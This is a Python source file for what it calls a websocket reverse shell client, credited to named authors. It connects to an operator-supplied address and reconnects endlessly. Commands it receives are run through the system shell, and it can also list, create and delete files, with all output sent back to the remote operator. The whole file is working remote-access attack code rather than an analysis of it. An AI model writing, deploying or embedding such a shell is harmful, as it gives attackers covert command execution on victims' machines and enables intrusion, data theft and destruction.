import os
import time
import websocket
from subprocess import run, PIPE
from threading import Thread
from wget import download

"""
    | - intelligent Websocket Reverse shell Client - |
       | -  Made by NiGhTFuRy, Vaxer, MainSilent - |
        | ~ Redesign and Optimized By NiGhTFuRy ~ |
"""

address = "" # Copy the ws/wss link here


def on_message(ws, cmd : str):
    """Receive system commands and execute them."""
    cmd = cmd.strip()
    try:
        if len(cmd) > 0:
            # <- ---- list current directory contents ---- ->
            if "dir" in cmd and len(cmd) < 4:
                ws.send("\n | ".join(os.listdir()))
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
            elif "cmd" in cmd or "powershell" in cmd:
                ws.send("[!] starting a new shell is not supported yet.")
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")

                
            elif "ls" in cmd and len(cmd) < 3:
                ws.send("\n | ".join(os.listdir()))
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
                
            # <- ----  get current directory path ---- ->
            elif "cd" in cmd and len(cmd) < 3:
                ws.send(f"{os.getcwd()}>")
            elif "pwd" in cmd and len(cmd) < 4:
                ws.send(f"{os.getcwd()}>")
                
            # <- ----  Change Directory ---- ->
            elif "cd" in cmd and len(cmd) > 3:
                os.chdir(cmd[3:])
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
            elif len(cmd) == 2 and ":" in cmd:
                os.chdir(cmd)
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
            # <- ---- Make a Directory ---- ->
            elif "mkdir" in cmd:
                os.mkdir(cmd[5:])
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
            elif "touch" in cmd and len(cmd) > 6:
                with open(f'{cmd[5:]}', 'w') as f:
                    f.close()
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
            elif "del" in cmd:
                os.remove(cmd[3:])
                ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")

            else:
                out = run(cmd, shell=True, capture_output=True, text=True)
                data = out.stdout
                if len(data) > 0:
                    ws.send(data)
                    ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
                else:
                    ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
        else:
            ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
            

    except Exception as e:
        ws.send("[!] Error executing command")
        ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")
        print(e)
        
def on_open(ws):
    print("WebSocket connection established")
    ws.send(f"({os.getlogin()}@windows) '{os.getcwd()}'>")

def on_close(ws):
    print("Connection Closed")

def on_error(ws, error):
    time.sleep(3)
    print(error)

def connect():
    """Establish a connection to the address, then call receiver()"""
    while True:
        try:
            ws = websocket.WebSocketApp(address, on_open=on_open, on_message=on_message, on_close=on_close, on_error=on_error)
            ws.run_forever()
        except Exception as e:
            print("Connection Error: " + str(e))
            time.sleep(5)
            continue

if __name__ == "__main__":

    while True:
        try:
            print("Creating new worker...")
            p = Thread(target=connect)
            p.start()
            p.join()
            print("Worker terminated\n")
        except:
            time.sleep(2)
            pass